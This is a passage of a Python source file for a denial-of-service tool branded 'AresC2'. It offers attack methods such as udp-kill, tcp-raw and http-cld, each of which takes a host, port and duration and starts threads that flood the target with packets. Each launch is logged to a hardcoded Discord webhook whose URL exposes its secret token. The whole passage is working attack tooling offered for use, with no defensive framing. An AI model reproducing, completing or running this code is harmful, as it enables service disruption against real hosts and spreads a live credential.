                    os.system("clear")
                    print(start8)
                    time.sleep(1)
                    os.system("clear")
                    print(start9)
                    time.sleep(1)
                    os.system("clear")
                    print(start10)
                    time.sleep(1)           
                    os.system("clear")
                    print(f"""
\033[95m╦═════════════════╦═══════════════════╦
        \033[95mTARGET: \033[97m[\033[95m%s\033[97m]  
        \033[95mPORT: \033[97m[\033[95m%s\033[97m]
        \033[95mTIME: \033[97m[\033[95m%s\033[97m]
        \033[95mMETHODS: \033[97m[\033[95mhttp-stm\033[97m]
\033[95m═══════════════════════════════════════

        \033[95mUSERNAME: \033[97m[\033[95m{username}\033[97m]
        \033[95mVIP : \033[97m[\033[92mTRUE\033[93m\033[97m]

\033[95m╩═══════════════════╩═════════════════╩
                        """%(host,port,timer))      
                    print(attacked)
                    webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1133454576243195945/bTLPsdzB5f86yrsVnfFmwdstjdEwHmPbsB8ruscgCvJvCZ7-i-A-xQ8Cmnn6J1YopMG4", username="AresC2")

                    embed = DiscordEmbed(title=" :zap: Sending Attack! :zap:", value=f'Sending Attack By User __root__', color=0xe74c3c)

                    embed.set_timestamp()
                    embed.set_footer(text="©️ AresC2")
                    embed.add_embed_field(name='**__Host__**', value=f'{host}')
                    embed.add_embed_field(name='**__Time__**', value=f'{timer}')
                    embed.add_embed_field(name='**__Port__**', value=f'{port}')
                    embed.add_embed_field(name='**__Methods__**', value='http-stm')

                    webhook.add_embed(embed)
                    response = webhook.execute()

            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "http-cld":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 65500
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()

                    os.system("clear")
                    print(start)
                    time.sleep(1)
                    os.system("clear")
                    print(start2)
                    time.sleep(1)
                    os.system("clear")
                    print(start3)
                    time.sleep(1)
                    os.system("clear")
                    print(start4)
                    time.sleep(1)
                    os.system("clear")
                    print(start5)
                    time.sleep(1)
                    os.system("clear")
                    print(start6)
                    time.sleep(1)
                    os.system("clear")
                    print(start7)
                    time.sleep(1)
                    os.system("clear")
                    print(start8)
                    time.sleep(1)
                    os.system("clear")
                    print(start9)
                    time.sleep(1)
                    os.system("clear")
                    print(start10)
                    time.sleep(1)    
                    os.system("clear")
                    print(f"""
\033[95m╦═════════════════╦═══════════════════╦
        \033[95mTARGET: \033[97m[\033[95m%s\033[97m]  
        \033[95mPORT: \033[97m[\033[95m%s\033[97m]
        \033[95mTIME: \033[97m[\033[95m%s\033[97m]
        \033[95mMETHODS: \033[97m[\033[95mhttp=cld\033[97m]
\033[95m═══════════════════════════════════════

        \033[95mUSERNAME: \033[97m[\033[95m{username}\033[97m]
        \033[95mVIP : \033[97m[\033[92mTRUE\033[93m\033[97m]

\033[95m╩═══════════════════╩═════════════════╩
                        """%(host,port,timer))             
                    print(attacked)
                    webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1133454576243195945/bTLPsdzB5f86yrsVnfFmwdstjdEwHmPbsB8ruscgCvJvCZ7-i-A-xQ8Cmnn6J1YopMG4", username="AresC2")

                    embed = DiscordEmbed(title=" :zap: Sending Attack! :zap:", value=f'Sending Attack By User __root__', color=0xe74c3c)

                    embed.set_timestamp()
                    embed.set_footer(text="©️ AresC2")
                    embed.add_embed_field(name='**__Host__**', value=f'{host}')
                    embed.add_embed_field(name='**__Time__**', value=f'{timer}')
                    embed.add_embed_field(name='**__Port__**', value=f'{port}')
                    embed.add_embed_field(name='**__Methods__**', value='http-cld')

                    webhook.add_embed(embed)
                    response = webhook.execute()

            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "ddos-guard":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 65500
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()

                    os.system("clear")
                    print(start)
                    time.sleep(1)
                    os.system("clear")
                    print(start2)
                    time.sleep(1)
                    os.system("clear")
                    print(start3)
                    time.sleep(1)
                    os.system("clear")
                    print(start4)
                    time.sleep(1)
                    os.system("clear")
                    print(start5)
                    time.sleep(1)
                    os.system("clear")
                    print(start6)
                    time.sleep(1)
                    os.system("clear")
                    print(start7)
                    time.sleep(1)
                    os.system("clear")
                    print(start8)
                    time.sleep(1)
                    os.system("clear")
                    print(start9)
                    time.sleep(1)
                    os.system("clear")
                    print(start10)
                    time.sleep(1) 
                    os.system("clear")
                    print(f"""
\033[95m╦═════════════════╦═══════════════════╦
        \033[95mTARGET: \033[97m[\033[95m%s\033[97m]  
        \033[95mPORT: \033[97m[\033[95m%s\033[97m]
        \033[95mTIME: \033[97m[\033[95m%s\033[97m]
        \033[95mMETHODS: \033[97m[\033[95mddos-guard\033[97m]
\033[95m═══════════════════════════════════════

        \033[95mUSERNAME: \033[97m[\033[95m{username}\033[97m]
        \033[95mVIP : \033[97m[\033[92mTRUE\033[93m\033[97m]

\033[95m╩═══════════════════╩═════════════════╩
                        """%(host,port,timer))                
                    print(attacked)

                    webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1133454576243195945/bTLPsdzB5f86yrsVnfFmwdstjdEwHmPbsB8ruscgCvJvCZ7-i-A-xQ8Cmnn6J1YopMG4", username="AresC2")

                    embed = DiscordEmbed(title=" :zap: Sending Attack! :zap:", value=f'Sending Attack By User __root__', color=0xe74c3c)

                    embed.set_timestamp()
                    embed.set_footer(text="©️ Are")
                    embed.add_embed_field(name='**__Host__**', value=f'{host}')
                    embed.add_embed_field(name='**__Time__**', value=f'{timer}')
                    embed.add_embed_field(name='**__Port__**', value=f'{port}')
                    embed.add_embed_field(name='**__Methods__**', value='ddos-guard')

                    webhook.add_embed(embed)
                    response = webhook.execute()

            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "udp-down":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 1021
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
                    os.system("clear")
                    print(start)
                    time.sleep(1)
                    os.system("clear")
                    print(start2)
                    time.sleep(1)
                    os.system("clear")
                    print(start3)
                    time.sleep(1)
                    os.system("clear")
                    print(start4)
                    time.sleep(1)
                    os.system("clear")
                    print(start5)
                    time.sleep(1)
                    os.system("clear")
                    print(start6)
                    time.sleep(1)
                    os.system("clear")
                    print(start7)
                    time.sleep(1)
                    os.system("clear")
                    print(start8)
                    time.sleep(1)
                    os.system("clear")
                    print(start9)
                    time.sleep(1)
                    os.system("clear")
                    print(start10)
                    time.sleep(1)
                    os.system("clear")
                    print(f"""
\033[95m╦═════════════════╦═══════════════════╦
        \033[95mTARGET: \033[97m[\033[95m%s\033[97m]  
        \033[95mPORT: \033[97m[\033[95m%s\033[97m]
        \033[95mTIME: \033[97m[\033[95m%s\033[97m]
        \033[95mMETHODS: \033[97m[\033[95mudp-down\033[97m]
\033[95m═══════════════════════════════════════

        \033[95mUSERNAME: \033[97m[\033[95m{username}\033[97m]
        \033[95mVIP : \033[97m[\033[92mTRUE\033[93m\033[97m]

\033[95m╩═══════════════════╩═════════════════╩
                        """%(host,port,timer))                    
                    print(attacked)

            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "udp-kill":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 666
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
                    os.system("clear")
                    print(start)
                    time.sleep(1)
                    os.system("clear")
                    print(start2)
                    time.sleep(1)
                    os.system("clear")
                    print(start3)
                    time.sleep(1)
                    os.system("clear")
                    print(start4)
                    time.sleep(1)
                    os.system("clear")
                    print(start5)
                    time.sleep(1)
                    os.system("clear")
                    print(start6)
                    time.sleep(1)
                    os.system("clear")
                    print(start7)
                    time.sleep(1)
                    os.system("clear")
                    print(start8)
                    time.sleep(1)
                    os.system("clear")
                    print(start9)
                    time.sleep(1)
                    os.system("clear")
                    print(start10)
                    time.sleep(1)
                    os.system("clear")
                    print(f"""
\033[95m╦═════════════════╦═══════════════════╦
        \033[95mTARGET: \033[97m[\033[95m%s\033[97m]  
        \033[95mPORT: \033[97m[\033[95m%s\033[97m]
        \033[95mTIME: \033[97m[\033[95m%s\033[97m]
        \033[95mMETHODS: \033[97m[\033[95mudp-kill\033[97m]
\033[95m═══════════════════════════════════════

        \033[95mUSERNAME: \033[97m[\033[95m{username}\033[97m]
        \033[95mVIP : \033[97m[\033[92mTRUE\033[93m\033[97m]

\033[95m╩═══════════════════╩═════════════════╩
                        """%(host,port,timer))                    
                    print(attacked)

                    webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1133454576243195945/bTLPsdzB5f86yrsVnfFmwdstjdEwHmPbsB8ruscgCvJvCZ7-i-A-xQ8Cmnn6J1YopMG4", username="AresC2")

                    embed = DiscordEmbed(title=" :zap: Sending Attack! :zap:", value=f'Sending Attack By User __root__', color=0xe74c3c)

                    embed.set_timestamp()
                    embed.set_footer(text="©️ AresC2")
                    embed.add_embed_field(name='**__Host__**', value=f'{host}')
                    embed.add_embed_field(name='**__Time__**', value=f'{timer}')
                    embed.add_embed_field(name='**__Port__**', value=f'{port}')
                    embed.add_embed_field(name='**__Methods__**', value='udp-kill')

                    webhook.add_embed(embed)
                    response = webhook.execute()

            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "tcp-rape":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                    threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
                    os.system("clear")
                    print(start)
                    time.sleep(1)
                    os.system("clear")
                    print(start2)
                    time.sleep(1)
                    os.system("clear")
                    print(start3)
                    time.sleep(1)
                    os.system("clear")
                    print(start4)
                    time.sleep(1)
                    os.system("clear")
                    print(start5)
                    time.sleep(1)
                    os.system("clear")
                    print(start6)
                    time.sleep(1)
                    os.system("clear")
                    print(start7)
                    time.sleep(1)
                    os.system("clear")
                    print(start8)
                    time.sleep(1)
                    os.system("clear")
                    print(start9)
                    time.sleep(1)
                    os.system("clear")
                    print(start10)
                    time.sleep(1)  
                    os.system("clear")
                    print(f"""
\033[95m╦═════════════════╦═══════════════════╦
        \033[95mTARGET: \033[97m[\033[95m%s\033[97m]  
        \033[95mPORT: \033[97m[\033[95m%s\033[97m]
        \033[95mTIME: \033[97m[\033[95m%s\033[97m]
        \033[95mMETHODS: \033[97m[\033[95mtcp-rape\033[97m]
\033[95m═══════════════════════════════════════

        \033[95mUSERNAME: \033[97m[\033[95m{username}\033[97m]
        \033[95mVIP : \033[97m[\033[92mTRUE\033[93m\033[97m]

\033[95m╩═══════════════════╩═════════════════╩
                        """%(host,port,timer))                  
                    print(attacked)

                    webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1133454576243195945/bTLPsdzB5f86yrsVnfFmwdstjdEwHmPbsB8ruscgCvJvCZ7-i-A-xQ8Cmnn6J1YopMG4", username="AresC2")

                    embed = DiscordEmbed(title=" :zap: Sending Attack! :zap:", value=f'Sending Attack By User __root__', color=0xe74c3c)

                    embed.set_timestamp()
                    embed.set_footer(text="©️ AresC2")
                    embed.add_embed_field(name='**__Host__**', value=f'{host}')
                    embed.add_embed_field(name='**__Time__**', value=f'{timer}')
                    embed.add_embed_field(name='**__Port__**', value=f'{port}')
                    embed.add_embed_field(name='**__Methods__**', value='tcp-rape')

                    webhook.add_embed(embed)
                    response = webhook.execute()

            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "tcp-raw":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    payload = b"\x55\x55\x55\x55\x00\x00\x00\x01"
                    threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
                    os.system("clear")
                    print(start)
                    time.sleep(1)
                    os.system("clear")
                    print(start2)
                    time.sleep(1)
                    os.system("clear")
                    print(start3)
                    time.sleep(1)
                    os.system("clear")
                    print(start4)
                    time.sleep(1)
                    os.system("clear")
                    print(start5)
                    time.sleep(1)
                    os.system("clear")
                    print(start6)
                    time.sleep(1)
                    os.system("clear")
                    print(start7)
                    time.sleep(1)
                    os.system("clear")
                    print(start8)
                    time.sleep(1)
                    os.system("clear")
                    print(start9)
                    time.sleep(1)
                    os.system("clear")
                    print(start10)
                    time.sleep(1)  
                    os.system("clear")
                    print(f"""
\033[95m╦═════════════════╦═══════════════════╦
        \033[95mTARGET: \033[97m[\033[95m%s\033[97m]  
        \033[95mPORT: \033[97m[\033[95m%s\033[97m]
        \033[95mTIME: \033[97m[\033[95m%s\033[97m]
        \033[95mMETHODS: \033[97m[\033[95mtcp-raw\033[97m]
\033[95m═══════════════════════════════════════

        \033[95mUSERNAME: \033[97m[\033[95m{username}\033[97m]
        \033[95mVIP : \033[97m[\033[92mTRUE\033[93m\033[97m]

\033[95m╩═══════════════════╩═════════════════╩
                        """%(host,port,timer))                  
                    print(attacked)

                    webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1133454576243195945/bTLPsdzB5f86yrsVnfFmwdstjdEwHmPbsB8ruscgCvJvCZ7-i-A-xQ8Cmnn6J1YopMG4", username="AresC2")

                    embed = DiscordEmbed(title=" :zap: Sending Attack! :zap:", value=f'Sending Attack By User __root__', color=0xe74c3c)

                    embed.set_timestamp()
                    embed.set_footer(text="©️ AresC2")
                    embed.add_embed_field(name='**__Host__**', value=f'{host}')
                    embed.add_embed_field(name='**__Time__**', value=f'{timer}')
                    embed.add_embed_field(name='**__Port__**', value=f'{port}')
                    embed.add_embed_field(name='**__Methods__**', value='tcp-raw')

                    webhook.add_embed(embed)
                    response = webhook.execute()

            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "tcp-down":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 102400
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
                    os.system("clear")
                    print(start)
                    time.sleep(1)
                    os.system("clear")
                    print(start2)
                    time.sleep(1)
                    os.system("clear")
                    print(start3)
                    time.sleep(1)
                    os.system("clear")
                    print(start4)
                    time.sleep(1)
                    os.system("clear")
                    print(start5)
                    time.sleep(1)
                    os.system("clear")
                    print(start6)
                    time.sleep(1)
                    os.system("clear")
                    print(start7)
                    time.sleep(1)
                    os.system("clear")
                    print(start8)
                    time.sleep(1)
                    os.system("clear")
                    print(start9)
                    time.sleep(1)
                    os.system("clear")
                    print(start10)
                    time.sleep(1)  
                    os.system("clear")
                    print(f"""
\033[95m╦═════════════════╦═══════════════════╦
        \033[95mTARGET: \033[97m[\033[95m%s\033[97m]  
        \033[95mPORT: \033[97m[\033[95m%s\033[97m]
        \033[95mTIME: \033[97m[\033[95m%s\033[97m]
        \033[95mMETHODS: \033[97m[\033[95mtcp-down\033[97m]
\033[95m═══════════════════════════════════════

        \033[95mUSERNAME: \033[97m[\033[95m{username}\033[97m]
        \033[95mVIP : \033[97m[\033[92mTRUE\033[93m\033[97m]

\033[95m╩═══════════════════╩═════════════════╩
                        """%(host,port,timer))                  
                    print(attacked)
                    webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1133454576243195945/bTLPsdzB5f86yrsVnfFmwdstjdEwHmPbsB8ruscgCvJvCZ7-i-A-xQ8Cmnn6J1YopMG4", username="AresC2")

                    embed = DiscordEmbed(title=" :zap: Sending Attack! :zap:", value=f'Sending Attack By User __root__', color=0xe74c3c)

                    embed.set_timestamp()
                    embed.set_footer(text="©️ AresC2")
                    embed.add_embed_field(name='**__Host__**', value=f'{host}')
                    embed.add_embed_field(name='**__Time__**', value=f'{timer}')
                    embed.add_embed_field(name='**__Port__**', value=f'{port}')
                    embed.add_embed_field(name='**__Methods__**', value='tcp-down')

                    webhook.add_embed(embed)
                    response = webhook.execute()

            except ValueError:
                main()
            except socket.gaierror:
                main()
                
        elif sinput == "stopattacks":
            attack = False
            while not attack:
                if aid == 0:
                    attack = True
        elif sinput == "stop":
            attack = False
            while not attack:
                if aid == 0:
                    attack = True

        else:
            main()


try:
    clear = "clear"
    os.system("clear")
    print(banner)
    main()
except KeyboardInterrupt:
    exit()
